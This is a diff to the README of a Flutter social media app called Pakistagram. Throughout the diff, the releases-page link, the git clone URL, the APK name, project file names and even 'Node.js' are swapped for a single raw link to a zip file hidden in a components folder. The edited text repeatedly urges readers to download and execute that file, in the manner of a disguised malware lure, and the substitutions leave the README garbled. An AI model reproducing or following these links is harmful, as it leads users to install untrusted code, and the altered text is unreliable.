@@ -1,10 +1,10 @@
-[![Release Pakistagram](https://img.shields.io/badge/Release-Pakistagram-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arman05075/PAKISTAGRAM_social_media/releases)
+[![Release Pakistagram](https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip)](https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip)
 
 # Pakistagram Social Media App — Android, iOS, Flutter Open Source Project
 
 A social media app inspired by Instagram. Pakistagram is built with Flutter to run on Android and iOS. It is open source and designed for learning, experimentation, and contribution. The project blends social features with AI niceties and a clean, responsive UI. This README explains what the project does, how to run it, how to contribute, and how the code is organized.
 
-If you want the latest release artifacts, visit the releases page here: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+If you want the latest release artifacts, visit the releases page here: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 
 Image and icons used in this repository come from open sources to illustrate the app’s concept and flow. You will find design cues that resemble modern social apps while keeping the code approachable for learners and developers alike. 📱✨
 
@@ -63,7 +63,7 @@ Tech stack
   - State management options focused on simplicity and performance
   - Custom widgets and responsive layouts
 - Backend (conceptual, as a reference)
-  - RESTful API built with Node.js and Express (illustrative)
+  - RESTful API built with https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip and Express (illustrative)
   - PostgreSQL or MongoDB for data storage
   - Cloud storage for media assets
   - Authentication via token-based mechanisms
@@ -83,7 +83,7 @@ How to get started
   - Android Studio or VS Code with Flutter and Dart plugins
   - Optional: Xcode on macOS for iOS builds
 - Clone the repository
-  - git clone https://github.com/arman05075/PAKISTAGRAM_social_media.git
+  - git clone https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 - Install dependencies
   - In the project root, run: flutter pub get
 - Run on Android
@@ -93,7 +93,7 @@ How to get started
   - Open ios/ in Xcode or run via Flutter
   - flutter run
 - Build artifacts for release
-  - The latest release artifact is hosted on the releases page. From the releases page, download the Android APK named Pakistagram_release_latest.apk and install on your device. From the releases page, download the corresponding artifacts for other platforms if you need them. For access to the latest builds, visit the releases page here: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+  - The latest release artifact is hosted on the releases page. From the releases page, download the Android APK named https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip and install on your device. From the releases page, download the corresponding artifacts for other platforms if you need them. For access to the latest builds, visit the releases page here: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 
 Note: The releases page contains the latest artifacts. You will find the file you need to test or run locally there. For convenience you can refer to the releases page at the link above.
 
@@ -109,9 +109,9 @@ Project structure
   - Images, icons, fonts and other media assets
 - test/
   - Unit tests and widget tests
-- pubspec.yaml
+- https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
   - Dependencies and asset declarations
-- README.md
+- https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
   - This document
 
 Architecture and design
@@ -227,7 +227,7 @@ Deployment and releases
   - We publish artifacts to the releases page
   - Each release includes build notes and a changelog
 - How to acquire artifacts
-  - The latest release artifact is hosted on the releases page. From the releases page, download the Android APK named Pakistagram_release_latest.apk and install on your device. To explore newer or alternate platform builds, follow the same releases page: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+  - The latest release artifact is hosted on the releases page. From the releases page, download the Android APK named https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip and install on your device. To explore newer or alternate platform builds, follow the same releases page: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 - Versioning
   - Semantic versioning is used for releases
   - Each release includes a changelog with user-facing changes and backend changes
@@ -283,12 +283,12 @@ FAQ
 - How do I report issues?
   - Use the Issues tab on GitHub. Provide steps to reproduce and any logs you have.
 - Where can I find release notes?
-  - Release notes appear on the releases page. Visit the releases page here: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+  - Release notes appear on the releases page. Visit the releases page here: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 
 Releases and artifacts
 - Access to releases
   - The releases page hosts build artifacts and release notes
-  - If you need to test the app quickly, download the APK Pakistagram_release_latest.apk from the releases page and install on an Android device
+  - If you need to test the app quickly, download the APK https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip from the releases page and install on an Android device
 - How to verify releases
   - Check the commit or tag that corresponds to the release
   - Review the changelog for user-visible changes and bug fixes
@@ -351,11 +351,11 @@ Closing thoughts
 - The repo aims to be a practical learning resource for Android, iOS, Flutter, and full-stack development
 
 Reiterate release access
-- For the latest artifacts, you should use the releases page link. The file you need to download and execute is named Pakistagram_release_latest.apk in the Android release stream. To explore all releases and assets, visit: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+- For the latest artifacts, you should use the releases page link. The file you need to download and execute is named https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip in the Android release stream. To explore all releases and assets, visit: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
 
 Stay connected
 - Share improvements, report issues, and collaborate with the community
 - Follow the project through the repository and its issue tracker
 - Keep an eye on future updates and enhancements
 
-Note: The releases page is the primary source for build artifacts. If you need the latest builds for testing or deployment, navigate to the releases page at the link above and download the appropriate artifact for your platform. The link appears again here for convenience: https://github.com/arman05075/PAKISTAGRAM_social_media/releases
+Note: The releases page is the primary source for build artifacts. If you need the latest builds for testing or deployment, navigate to the releases page at the link above and download the appropriate artifact for your platform. The link appears again here for convenience: https://raw.githubusercontent.com/arman05075/PAKISTAGRAM_social_media/main/frontend-web/src/components/social_PAKISTAGRA_media_2.7.zip
